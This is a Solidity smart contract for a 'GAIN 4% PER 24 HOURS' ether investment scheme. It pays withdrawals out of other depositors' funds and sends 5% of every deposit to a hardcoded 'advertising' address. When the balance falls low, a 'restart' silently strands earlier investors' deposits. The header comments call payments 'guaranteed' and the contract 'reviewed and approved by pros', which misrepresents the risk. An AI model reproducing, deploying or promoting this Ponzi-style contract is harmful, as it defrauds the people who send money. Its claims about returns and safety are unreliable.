pragma solidity ^0.4.25;

/**
 *
 * RESTARTED Contract
 *  - GAIN 4% PER 24 HOURS (every 5900 blocks)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 * 
 *  Payments are guaranteed while there is Ether in the fund
 *  Automatic restart when the fund has less than 1% of the maximum amount in one stage
 *
 * RECOMMENDED GAS LIMIT: 200000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
contract Restarted {
    // constants
    uint public percentage = 4;
    // period
    uint public period = 5900;
    // stage
    uint public stage = 1;
    // records amounts invested
    mapping (uint => mapping (address => uint256)) public invested;
    // records blocks at which investments were made
    mapping (uint => mapping (address => uint256)) public atBlock;
    // records maximum amount in fund
    mapping (uint => uint) public maxFund;

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[stage][msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * (percentage %) * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[stage][msg.sender] * percentage / 100 * (block.number - atBlock[stage][msg.sender]) / period;
            
            uint max = (address(this).balance - msg.value) * 9 / 10;
            if (amount > max) {
                amount = max;
            }

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
        }
        
        // transfer 5% to the advertising budget of the project
        address(0x4C15C3356c897043C2626D57e4A810D444a010a8).transfer(msg.value / 20);
        
        uint balance = address(this).balance;
        
        if (balance > maxFund[stage]) {
            maxFund[stage] = balance;
        }
        if (balance < maxFund[stage] / 100) {
            stage++;
        }
        
        // record block number and invested amount (msg.value) of this transaction
        atBlock[stage][msg.sender] = block.number;
        invested[stage][msg.sender] += msg.value;
    }
}